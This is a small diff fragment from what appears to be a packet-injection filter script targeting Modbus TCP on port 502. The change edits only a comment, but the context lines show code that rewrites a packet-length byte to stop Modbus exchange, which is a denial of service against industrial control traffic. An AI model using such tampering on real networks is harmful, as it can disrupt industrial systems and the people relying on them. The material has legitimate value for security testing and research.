@@ -26,7 +26,7 @@ if(ip.proto == TCP && tcp.dst == 502) {
 
 
 # Inject a malicious value to change the packet length. 
-# This type of response injections stops modbus packet exchange (DoS Modbus)
+# This type of response injections stops modbus packet exchange (DoS Modbus). Refer the Modbus TCP frame to understand how it works.
 if(tcp.dst == 502 && DATA.data + 5 == "\x08") {
                     msg("Packet length match");
                     DATA.data + 5 = 1;
